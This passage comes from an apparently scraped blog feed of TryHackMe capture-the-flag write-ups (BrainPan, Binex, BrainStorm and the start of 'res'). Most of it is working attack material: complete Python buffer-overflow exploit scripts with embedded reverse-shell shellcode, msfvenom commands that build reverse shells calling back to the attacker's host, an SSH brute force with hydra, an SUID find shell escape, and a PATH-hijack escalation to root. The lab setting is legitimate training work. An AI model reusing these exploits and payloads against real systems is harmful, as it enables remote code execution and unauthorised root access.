interesting.\nThis directory contains an executable file which is the application running on port 9999.\nTrying a netcat to port 9999. We get this password prompt.\nFuzzing # We are working with a buffer overflow, so let us trying crashing the application running on port 9999\nWe indeed get a crashing confirming existence of a buffer overflow.\nDownload the executable file and transfer it to your Windows VM. We will work with Immunity debugger.\nRun the application and try connecting to it using our VM’s IP.\nWe can test the connection using netcat. We get the connection back. Everything set up, let’s get hacking :)\nStep 1: Finding the size of the crash # We need to find the approximate number of bytes that crashed our application. Attach it to immunity debugger and we can write a python script to send some bytes to the application till it crashes.\nimport socket IP = \u0026#34;192.168.100.85\u0026#34; PORT = 9999 s = socket.socket() s.connect((IP,PORT)) buffer = [ b\u0026#34;A\u0026#34;*100 ] buffer = b\u0026#34;\u0026#34;.join(buffer) while True: s.send(buffer) buffer = buffer + b\u0026#34;A\u0026#34;*100 Head over to immunity debugger and see that our application crashed\nTo calculate the size of the crash, right click on esp , follow in dump. Check the address where the As start and end\nWe get 2072. We will use this as the default length of bytes.\nModify our script as follows.\nimport socket IP = \u0026#34;192.168.100.85\u0026#34; PORT = 9999 s = socket.socket() s.connect((IP,PORT)) total_length = 2072 buffer = [ b\u0026#34;A\u0026#34;*total_length ] buffer = b\u0026#34;\u0026#34;.join(buffer) s.send(buffer) Step 2: Finding the offset # Next we need to find out the exact number of bytes within the total_length that actually cause the crash. We use msf pattern create and pattern offset. /usr/bin/msf-pattern_create -l 2072\nCopy the result and modify our script as follows\nimport socket IP = \u0026#34;192.168.100.85\u0026#34; PORT = 9999 s = socket.socket() s.connect((IP,PORT)) total_length = 2072 buffer = [ b\u0026#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr\u0026#34; ] buffer = b\u0026#34;\u0026#34;.join(buffer) s.send(buffer) Run the script and note the value of the EIP\n/usr/bin/msf-pattern_offset -l 2072 -q 35724134 [*] Exact match at offset 524 We get our offset at 524. This means we have exactly 524 bytes before we reach the EIP register\nStep 3: Controlling the EIP # We modify our script as follows and observe the EIP register\nimport socket IP = \u0026#34;192.168.100.85\u0026#34; PORT = 9999 s = socket.socket() s.connect((IP,PORT)) total_length = 2072 offset = 524 buffer = [ b\u0026#34;A\u0026#34; * offset, b\u0026#34;B\u0026#34; * 4 ] buffer = b\u0026#34;\u0026#34;.join(buffer) s.send(buffer) We try controlling the EIP with 4Bs and get the ascii value for B as 42424242 on the EIP register.\nWe have control over the EIP.\nStep 4: Finding the bad characters # We need to determine the characters that brainpan does not like. This will help us create our payload without the bad characters.\nI like to use the struct inbuilt module with list comprehension. Modify your script as follows and send the bad characters.\nimport socket from struct import pack bad_chars = b\u0026#34;\u0026#34;.join([pack(\u0026#34;\u0026lt;B\u0026#34;,x) for x in range(1,256)]) IP = \u0026#34;192.168.100.85\u0026#34; PORT = 9999 s = socket.socket() s.connect((IP,PORT)) total_length = 2072 offset = 524 buffer = [ bad_chars, b\u0026#34;A\u0026#34; * (total_length - len(bad_chars)), ] buffer = b\u0026#34;\u0026#34;.join(buffer) s.send(buffer) We can observe the characters in the hex dump and see if we get any bad ones. Luckily for us there are no bad characters here.\nStep 5: Finding a JMP ESP instruction # We need to find a JMP ESP instruction that will take us to the top of the stack. We will use this JMP ESP as the new EIP so that we hijack the control flow of the program.\nWe can use the mona module !mona jmp -r esp We get an address that points to a jmp esp instruction 0x311712F3\nSet a breakpoint at that instruction. Ctrl+G , enter the address value then press enter and set breakpoint.\nModify our script as follows and observe that we hit the breakpoint,\nimport socket from struct import pack bad_chars = b\u0026#34;\u0026#34;.join([pack(\u0026#34;\u0026lt;B\u0026#34;,x) for x in range(1,256)]) IP = \u0026#34;192.168.100.85\u0026#34; PORT = 9999 s = socket.socket() s.connect((IP,PORT)) total_length = 2072 offset = 524 new_eip = pack(\u0026#34;\u0026lt;I\u0026#34;,0x311712F3) buffer = [ b\u0026#34;A\u0026#34; * offset, new_eip, b\u0026#34;C\u0026#34; * (total_length-offset) ] buffer = b\u0026#34;\u0026#34;.join(buffer) s.send(buffer) step through the code using f7 and observe how we get redirected to the top of the stack\nStep 6: Generating shellcode # Now we can generate shellcode to get a reverse shell on our program\nmsfvenom -p windows/shell_reverse_tcp LHOST=wlan0 LPORT=4444 -e x86/shikata_ga_nai -f py -b \u0026#34;\\x00\u0026#34; Modify our script and send the payload while listening on port 4444\nSweet :) Our exploit worked. Now recreate the shellcode but with tun0 for tryhackme local IP. Change the IP in the script to the remote IP\nimport socket from struct import pack # bad_chars = b\u0026#34;\u0026#34;.join([pack(\u0026#34;\u0026lt;B\u0026#34;,x) for x in range(1,256)]) IP = \u0026#34;10.10.255.160\u0026#34; PORT = 9999 buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\xdb\\xd4\\xba\\x70\\xb3\\xd8\\x55\\xd9\\x74\\x24\\xf4\\x5b\\x29\u0026#34; buf += b\u0026#34;\\xc9\\xb1\\x52\\x83\\xc3\\x04\\x31\\x53\\x13\\x03\\x23\\xa0\\x3a\u0026#34; buf += b\u0026#34;\\xa0\\x3f\\x2e\\x38\\x4b\\xbf\\xaf\\x5d\\xc5\\x5a\\x9e\\x5d\\xb1\u0026#34; buf += b\u0026#34;\\x2f\\xb1\\x6d\\xb1\\x7d\\x3e\\x05\\x97\\x95\\xb5\\x6b\\x30\\x9a\u0026#34; buf += b\u0026#34;\\x7e\\xc1\\x66\\x95\\x7f\\x7a\\x5a\\xb4\\x03\\x81\\x8f\\x16\\x3d\u0026#34; buf += b\u0026#34;\\x4a\\xc2\\x57\\x7a\\xb7\\x2f\\x05\\xd3\\xb3\\x82\\xb9\\x50\\x89\u0026#34; buf += b\u0026#34;\\x1e\\x32\\x2a\\x1f\\x27\\xa7\\xfb\\x1e\\x06\\x76\\x77\\x79\\x88\u0026#34; buf += b\u0026#34;\\x79\\x54\\xf1\\x81\\x61\\xb9\\x3c\\x5b\\x1a\\x09\\xca\\x5a\\xca\u0026#34; buf += b\u0026#34;\\x43\\x33\\xf0\\x33\\x6c\\xc6\\x08\\x74\\x4b\\x39\\x7f\\x8c\\xaf\u0026#34; buf += b\u0026#34;\\xc4\\x78\\x4b\\xcd\\x12\\x0c\\x4f\\x75\\xd0\\xb6\\xab\\x87\\x35\u0026#34; buf += b\u0026#34;\\x20\\x38\\x8b\\xf2\\x26\\x66\\x88\\x05\\xea\\x1d\\xb4\\x8e\\x0d\u0026#34; buf += b\u0026#34;\\xf1\\x3c\\xd4\\x29\\xd5\\x65\\x8e\\x50\\x4c\\xc0\\x61\\x6c\\x8e\u0026#34; buf += b\u0026#34;\\xab\\xde\\xc8\\xc5\\x46\\x0a\\x61\\x84\\x0e\\xff\\x48\\x36\\xcf\u0026#34; buf += b\u0026#34;\\x97\\xdb\\x45\\xfd\\x38\\x70\\xc1\\x4d\\xb0\\x5e\\x16\\xb1\\xeb\u0026#34; buf += b\u0026#34;\\x27\\x88\\x4c\\x14\\x58\\x81\\x8a\\x40\\x08\\xb9\\x3b\\xe9\\xc3\u0026#34; buf += b\u0026#34;\\x39\\xc3\\x3c\\x43\\x69\\x6b\\xef\\x24\\xd9\\xcb\\x5f\\xcd\\x33\u0026#34; buf += b\u0026#34;\\xc4\\x80\\xed\\x3c\\x0e\\xa9\\x84\\xc7\\xd9\\xdc\\x5a\\xee\\xb8\u0026#34; buf += b\u0026#34;\\x89\\x58\\xf0\\xab\\x15\\xd4\\x16\\xa1\\xb5\\xb0\\x81\\x5e\\x2f\u0026#34; buf += b\u0026#34;\\x99\\x59\\xfe\\xb0\\x37\\x24\\xc0\\x3b\\xb4\\xd9\\x8f\\xcb\\xb1\u0026#34; buf += b\u0026#34;\\xc9\\x78\\x3c\\x8c\\xb3\\x2f\\x43\\x3a\\xdb\\xac\\xd6\\xa1\\x1b\u0026#34; buf += b\u0026#34;\\xba\\xca\\x7d\\x4c\\xeb\\x3d\\x74\\x18\\x01\\x67\\x2e\\x3e\\xd8\u0026#34; buf += b\u0026#34;\\xf1\\x09\\xfa\\x07\\xc2\\x94\\x03\\xc5\\x7e\\xb3\\x13\\x13\\x7e\u0026#34; buf += b\u0026#34;\\xff\\x47\\xcb\\x29\\xa9\\x31\\xad\\x83\\x1b\\xeb\\x67\\x7f\\xf2\u0026#34; buf += b\u0026#34;\\x7b\\xf1\\xb3\\xc5\\xfd\\xfe\\x99\\xb3\\xe1\\x4f\\x74\\x82\\x1e\u0026#34; buf += b\u0026#34;\\x7f\\x10\\x02\\x67\\x9d\\x80\\xed\\xb2\\x25\\xb0\\xa7\\x9e\\x0c\u0026#34; buf += b\u0026#34;\\x59\\x6e\\x4b\\x0d\\x04\\x91\\xa6\\x52\\x31\\x12\\x42\\x2b\\xc6\u0026#34; buf += b\u0026#34;\\x0a\\x27\\x2e\\x82\\x8c\\xd4\\x42\\x9b\\x78\\xda\\xf1\\x9c\\xa8\u0026#34; shellcode = buf s = socket.socket() s.connect((IP,PORT)) s.recv(1024) total_length = 2072 offset = 524 nop_sled = b\u0026#34;\\x90\u0026#34;*16 new_eip = pack(\u0026#34;\u0026lt;I\u0026#34;,0x311712F3) buffer = [ b\u0026#34;A\u0026#34; * offset, new_eip, nop_sled, shellcode, b\u0026#34;C\u0026#34; * (total_length-offset-len(shellcode)-len(nop_sled)-len(shellcode)) ] buffer = b\u0026#34;\u0026#34;.join(buffer) s.send(buffer) We get a shell :)\nHappy hacking :)\n","date":"5 April 2021","permalink":"/posts/2021-04-05_brainpantryhackme/","section":"Posts","summary":"Exploiting a buffer overflow vulnerability by analyzing a Windows executable.","title":"BrainPan-Tryhackme"},{"content":" Exploit an SUID bit file, use GNU debugger to take advantage of a buffer overflow and gain root access by PATH manipulation.\nEnumeration # Started off by running rustscan to discover open ports. We end up with port 22,139,445\nPort 139 and 445 are NBT and SMB services which we can enumerate with enum4linux\n139,445 - Pentesting SMB\nenum4linux -A \u0026lt;IP\u0026gt; The shares weren’t particularly worth looking into. So I let the enumeration finish and we discover some users. tryhackme sticks out so let’s try bruteforcing ssh with this user\nInitial Foothold # Running hydra against the username tryhackme and the rockyout.txt password list gives us the password to the ssh login\nWe can now login and exploit the binaries\nPrivilege escalation #1: SUID binary # We can begin by locating a binary with SUID bit set.\nfind / -perm -u=s -type f 2\u0026gt;/dev/null The /usr/bin/find can be exploited to execute commands as the des user\nfind | GTFOBins\nUsing the GTFOBins we obtain the command\n/usr/bin/find . -exec /bin/sh -p \\; -quit Execute it to obtain a shell with an effective user id of that of des. Navigate to /home/des to obtain his flag\nPrivilege escalation #2: Buffer Overflow # I am still new to 64-bit BOFs but I was able to navigate my way through this one with a bit of some tutorials.\nLet’s change user and work with des. Here we are given a binary file that accepts a string as input. Supplying a given length crashes it.\nI checked the file information and it’s a 64-bit ELF file\nFuzzing the binary file and finding the offset # We can generate a bunch of As and try figure out what length of As crash the binary\nLet’s do this inside gdb and observer how our registers behave\nThe rbp is overwritten with the As. Let us send a cyclic pattern and see if we can calculate the offset.\nSend that to our program , inspect the registers and copy the value of the rbp\nUse pattern_offset to find the pattern. We get it at 608\nOverwriting the RBP # We can confirm we have control over the RBP by trying to overwrite it. Generate a payload of 608 As + 8Bs\nThe rbp is overwritten with the 8Bs.\nExamining the stack # We now need to examine the stack further so we can find the starting address of the buffer. The command below prints 100 bytes from the top of the stack x/100x $rsp The command below gets us the start of the buffer\nx/100x $rsp-700 We can note down an address close to the start of the buffer, we will use this as the value of the rip while creating our final exploit\nCreating the final exploit # We intially found our offset to be 608 bytes, which means that if we write past 608 bytes eg 608 +8 = 616 bytes , we will overwrite the base pointer in the stack. Note that the return address lies just above it, hence 616+8 bytes are required to overwrite the saved return address.\nLet us create a shellcode which we use to spawn a shell using msfvenom\nPutting all these into a python script\nfrom struct import pack payload_len = 616 nop = b\u0026#34;\\x90\u0026#34;*200 new_rip = pack(\u0026#34;\u0026lt;Q\u0026#34;,0x7fffffffe2d4) #selected randomly near the start of the stack buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\x48\\x31\\xc9\\x48\\x81\\xe9\\xf6\\xff\\xff\\xff\\x48\\x8d\\x05\u0026#34; buf += b\u0026#34;\\xef\\xff\\xff\\xff\\x48\\xbb\\x32\\xa3\\x67\\xe0\\x79\\x51\\x8b\u0026#34; buf += b\u0026#34;\\x33\\x48\\x31\\x58\\x27\\x48\\x2d\\xf8\\xff\\xff\\xff\\xe2\\xf4\u0026#34; buf += b\u0026#34;\\x58\\x8a\\x3f\\x79\\x13\\x53\\xd4\\x59\\x33\\xfd\\x68\\xe5\\x31\u0026#34; buf += b\u0026#34;\\xc6\\xc3\\x8a\\x30\\xa3\\x76\\xbc\\x73\\x53\\xa2\\x92\\x63\\xeb\u0026#34; buf += b\u0026#34;\\xee\\x06\\x13\\x41\\xd1\\x59\\x18\\xfb\\x68\\xe5\\x13\\x52\\xd5\u0026#34; buf += b\u0026#34;\\x7b\\xcd\\x6d\\x0d\\xc1\\x21\\x5e\\x8e\\x46\\xc4\\xc9\\x5c\\xb8\u0026#34; buf += b\u0026#34;\\xe0\\x19\\x30\\x1c\\x50\\xca\\x09\\xcf\\x0a\\x39\\x8b\\x60\\x7a\u0026#34; buf += b\u0026#34;\\x2a\\x80\\xb2\\x2e\\x19\\x02\\xd5\\x3d\\xa6\\x67\\xe0\\x79\\x51\u0026#34; buf += b\u0026#34;\\x8b\\x33\u0026#34; shellcode = buf shellcode_len = len(shellcode) nop_len = len(nop) padding = b\u0026#34;A\u0026#34;*(payload_len-shellcode_len-nop_len) payload = [ nop, shellcode, padding, new_rip ] payload = b\u0026#34;\u0026#34;.join(payload) print(payload) The nop_sled is used to increase our chances of hitting the shellcode hence providing some stability to the exploit. The struct module ensures we obey little endian format\nStart a meterpreter shell or a nc one listening on port 4444\nWe get a reverse shell as kel user :) Get the flag and credentials to ssh as kel\nPrivilege escalation #3: Path Variable Manipulation # PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored\nthe exe.c file on user kel’s home directory shows that we are calling the ps system command. The program will search the ps command in the directories of the PATH variable. We can print out the PATH variables for the kel user as follows\nkel@THM_exploit:~$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin kel@THM_exploit:~$ We can stage our attack as follows - Create our own ps file that spawns a shell and add it to the beginning of $PATH. So when we run the exec binary, we get a shell as root\nkel@THM_exploit:~$ cd /tmp kel@THM_exploit:/tmp$ echo “/bin/bash” \u0026gt; ps kel@THM_exploit:/tmp$ chmod 777 ps kel@THM_exploit:/tmp$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin kel@THM_exploit:/tmp$ export PATH=/tmp:$PATH kel@THM_exploit:/tmp$ cd kel@THM_exploit:~$ ./exe root@THM_exploit:~#` We get root !\n","date":"1 April 2021","permalink":"/posts/2021-04-01_binextryhackme/","section":"Posts","summary":"Exploit an SUID bit file, use GNU debugger to take advantage of a buffer overflow and gain root access by PATH manipulation.","title":"Binex-Tryhackme"},{"content":" Reverse engineering a chat application to exploit a windows machine using a buffer overflow # Prerequisites # Windows 7/10 virtual environment Immunity Debugger Basic understanding of buffer overflows Enumeration # We Spin off the instance and get right into some enumeration. We can begin with some nmap or rustscan scanning to identify open ports\nFTP with anonymous login, RDP and a service running on port 9999. This seems to be a windows machine.\nWe can start off by anonymously accessing the FTP server ftp \u0026lt;;IP\u0026gt;;\nEnter username and password as anonymous\nWe can enumerate for directories and files using ls and cd . Inside the chatserver directory we get an executable and a dll file.\nLet’s save those to our local machine using get command.\nTesting the chat server # Okay, now we have some info from from ftp. Let’s access the service at port 9999. It is a chat server that asks for your username and a message. The username is constrained to 20 characters. The program running is the executable we got from ftp\nExploitation # For the exploitation phase, I will take you through writing a python exploit for a buffer overflow vulnerability to gain shell access on the windows machine.\nThe chat application asks us for a username of 20 characters, what if we supplied one of more than 20 characters? Let us see if we can trigger a crash in the application.\npython3 -c \u0026#34;print(‘A’*100)\u0026#34; Supply the 100 As as username and message. We don’t get a crash. Let us try 3000 As. The chat server crashes. This confirms existence of a buffer overflow on the message parameter since username filters out the remaining bytes.\nFuzzing with python # To inspect the crash, we need to work with chatserver.exe in our windows lab environment. We attach the executable to Immunity debugger as follows\nFile \u0026gt;; Open \u0026gt;; path_to_chatserver.exe\nRun it by pressing the play button or F5 key.\nLet us test if we can reach the chatserver from our local machine\nnc -nv \u0026lt;;windows IP\u0026gt;; 9999 We can now write a python fuzzing script to confirm the crash. Run the script and check Immunity debugger, once it crashes, kill the script.\nThe program crashes, confirming we have overflown the buffer space and overwritten the EIP with “41414141” which is ascii values for AAAAA\nFinding the offset # We sent a bunch of As to the server, it crashed. So now we need to figure out the size of the buffer before the EIP (the offset).\nOn immunity debugger, right click the ESP \u0026gt;; follow dump. Check the hex value for where the A starts and ends\nSubtract to get the size of the buffer we sent. We then create a pattern of different ascii values using metasploit module and send that as the buffer\n/usr/bin/msf-pattern_create -l 4088 We get the crash in Immunity Debugger\nThe value that overwrites the EIP is different from when we sent a bunch of As, this can help us determine where this value occurs within the buffer we sent. Copy the value and find the offset\n/usr/bin/msf-pattern_offset -l 4088 -q 31704330 So now we know we have exactly 2012 bytes before we reach the EIP\nControlling the EIP # Now we modify our script as follows\nWe send 4 Bs immediately after the 2012 As to confirm if we can take control of the EIP. We get 42424242 as the EIP showing that we have overwritten the EIP with the 4 Bs.\nFinding a JMP ESP # We need to locate a JMP ESP instruction in memory that we will use to redirect the control flow of the program to the stack. The address of the JMP ESP is placed in the EIP.\nWe can use the awesome mona python script to find the instruction\ncorelan/mona\n!mona jmp -r esp Copy the address of one of the results and then modify your python script. We add the new_eip variable immediately after our buffer to overwrite the EIP and jump to the top of the stack.\nTo verify we are indeed hitting the jump esp instruction, set a break point in Immunity debugger as follows.\nCtrl+G then paste the address of the jmp esp instruction. Press F2 to set breakpoint.\nSend the payload. We indeed hit the breakpoint\nFinding Bad characters # Since now we know that we control the EIP. Before we generate our shellcode, we need to find what bad characters might create problems in the execution of our shellcode, because the application won’t process those characters. Generally, the null byte (\\x00), the line feed (\\x0A) and the carriage return (\\x0D) are bad characters.\nWe can modify our script as follows to send the ascii characters into the stack and confirm in the hex dump if they all display correctly\nWe don’t get bad characters in the hex dump.\nGenerating shellcode # Since we are dealing with a windows executable, generate a shellcode specific to that using msfvenom\nmsfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.103 LPORT=4444 -e x86/shikata_ga_nai -f py -b \u0026#34;\\x00\u0026#34; Copy the shellcode into our program. Our final script looks as follows\nimport socket import struct IP = \u0026#34;192.168.0.104\u0026#34; PORT = 9999 s = socket.socket() s.connect((IP,PORT)) username = b\u0026#34;SAUDI\u0026#34; new_eip = struct.pack(\u0026#34;\u0026lt;I\u0026#34;,0x62501503) badchars = b\u0026#34;\u0026#34;.join([struct.pack(\u0026#34;\u0026lt;B\u0026#34;,x)for x in range(1,256)]) buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\xbd\\xaf\\x88\\xc7\\xb6\\xdb\\xd5\\xd9\\x74\\x24\\xf4\\x5e\\x2b\u0026#34; buf += b\u0026#34;\\xc9\\xb1\\x52\\x31\\x6e\\x12\\x83\\xc6\\x04\\x03\\xc1\\x86\\x25\u0026#34; buf += b\u0026#34;\\x43\\xe1\\x7f\\x2b\\xac\\x19\\x80\\x4c\\x24\\xfc\\xb1\\x4c\\x52\u0026#34; buf += b\u0026#34;\\x75\\xe1\\x7c\\x10\\xdb\\x0e\\xf6\\x74\\xcf\\x85\\x7a\\x51\\xe0\u0026#34; buf += b\u0026#34;\\x2e\\x30\\x87\\xcf\\xaf\\x69\\xfb\\x4e\\x2c\\x70\\x28\\xb0\\x0d\u0026#34; buf += b\u0026#34;\\xbb\\x3d\\xb1\\x4a\\xa6\\xcc\\xe3\\x03\\xac\\x63\\x13\\x27\\xf8\u0026#34; buf += b\u0026#34;\\xbf\\x98\\x7b\\xec\\xc7\\x7d\\xcb\\x0f\\xe9\\xd0\\x47\\x56\\x29\u0026#34; buf += b\u0026#34;\\xd3\\x84\\xe2\\x60\\xcb\\xc9\\xcf\\x3b\\x60\\x39\\xbb\\xbd\\xa0\u0026#34; buf += b\u0026#34;\\x73\\x44\\x11\\x8d\\xbb\\xb7\\x6b\\xca\\x7c\\x28\\x1e\\x22\\x7f\u0026#34; buf += b\u0026#34;\\xd5\\x19\\xf1\\xfd\\x01\\xaf\\xe1\\xa6\\xc2\\x17\\xcd\\x57\\x06\u0026#34; buf += b\u0026#34;\\xc1\\x86\\x54\\xe3\\x85\\xc0\\x78\\xf2\\x4a\\x7b\\x84\\x7f\\x6d\u0026#34; buf += b\u0026#34;\\xab\\x0c\\x3b\\x4a\\x6f\\x54\\x9f\\xf3\\x36\\x30\\x4e\\x0b\\x28\u0026#34; buf += b\u0026#34;\\x9b\\x2f\\xa9\\x23\\x36\\x3b\\xc0\\x6e\\x5f\\x88\\xe9\\x90\\x9f\u0026#34; buf += b\u0026#34;\\x86\\x7a\\xe3\\xad\\x09\\xd1\\x6b\\x9e\\xc2\\xff\\x6c\\xe1\\xf8\u0026#34; buf += b\u0026#34;\\xb8\\xe2\\x1c\\x03\\xb9\\x2b\\xdb\\x57\\xe9\\x43\\xca\\xd7\\x62\u0026#34; buf += b\u0026#34;\\x93\\xf3\\x0d\\x24\\xc3\\x5b\\xfe\\x85\\xb3\\x1b\\xae\\x6d\\xd9\u0026#34; buf += b\u0026#34;\\x93\\x91\\x8e\\xe2\\x79\\xba\\x25\\x19\\xea\\x05\\x11\\x21\\x8d\u0026#34; buf += b\u0026#34;\\xed\\x60\\x21\\x40\\xb2\\xed\\xc7\\x08\\x5a\\xb8\\x50\\xa5\\xc3\u0026#34; buf += b\u0026#34;\\xe1\\x2a\\x54\\x0b\\x3c\\x57\\x56\\x87\\xb3\\xa8\\x19\\x60\\xb9\u0026#34; buf += b\u0026#34;\\xba\\xce\\x80\\xf4\\xe0\\x59\\x9e\\x22\\x8c\\x06\\x0d\\xa9\\x4c\u0026#34; buf += b\u0026#34;\\x40\\x2e\\x66\\x1b\\x05\\x80\\x7f\\xc9\\xbb\\xbb\\x29\\xef\\x41\u0026#34; buf += b\u0026#34;\\x5d\\x11\\xab\\x9d\\x9e\\x9c\\x32\\x53\\x9a\\xba\\x24\\xad\\x23\u0026#34; buf += b\u0026#34;\\x87\\x10\\x61\\x72\\x51\\xce\\xc7\\x2c\\x13\\xb8\\x91\\x83\\xfd\u0026#34; buf += b\u0026#34;\\x2c\\x67\\xe8\\x3d\\x2a\\x68\\x25\\xc8\\xd2\\xd9\\x90\\x8d\\xed\u0026#34; buf += b\u0026#34;\\xd6\\x74\\x1a\\x96\\x0a\\xe5\\xe5\\x4d\\x8f\\x15\\xac\\xcf\\xa6\u0026#34; buf += b\u0026#34;\\xbd\\x69\\x9a\\xfa\\xa3\\x89\\x71\\x38\\xda\\x09\\x73\\xc1\\x19\u0026#34; buf += b\u0026#34;\\x11\\xf6\\xc4\\x66\\x95\\xeb\\xb4\\xf7\\x70\\x0b\\x6a\\xf7\\x50\u0026#34; shellcode = buf NOP_sled = \u0026#34;\\x90\u0026#34; * 15 s.send(username) s.recv(1024) total_length = 4088 offset = 2012 buffer = [ b\u0026#34;A\u0026#34; * offset, new_eip, NOP_sled, shellcode, b\u0026#34;C\u0026#34; *(total_length - offset - len(new_eip) - len(shellcode)) ] buffer = b\u0026#34;\u0026#34;.join(buffer) s.send(buffer) Set up a netcat listener on our local machine listening on port 4444, send the payload.\nWe get a reverse shell\nGetting the flag # Here we simply modify our target IP on the script to that of the remote IP in tryhackme.\nDon’t forget to generate a new payload with the IP of your tun0 interface.\nWe get access to the machine. Navigate your way to finding the flag.\nHappy hacking :)\n","date":"28 March 2021","permalink":"/posts/2021-03-28_tryhackme-brainstorm/","section":"Posts","summary":"Reverse engineering a chat application to exploit a windows machine using a buffer overflow # Prerequisites # Windows 7/10 virtual environment Immunity Debugger Basic understanding of buffer overflows Enumeration # We Spin off the instance and get right into some enumeration.","title":"TryhackMe -BrainStorm"},{"content":" In this brief walk-through , we will be hacking a vulnerable database server by showcasing the res room in Tryhackme.\nEnumeration # As always, spin up our machine instance and begin some enumeration. For speed and more accuracy, I perform a port scan using rustscan( an incredibly fast port scanning tool) and then do a default scripts and vuln scan using nmap as shown below\nrustscan -a \u0026lt;IP\u0026gt; nmap -sC -sV --scripts=vuln \u0026lt;IP\u0026gt; -p 80,6379 We get port 80 and 6379. Nmap does not gives us much info.\nWe have an exposed redis instance that we will look into and a web server running on port 80. Accessing this via browser we get a default apache page. Nothing interesing.\nWe can try bruteforcing for any important directories that may be worth looking into. Here 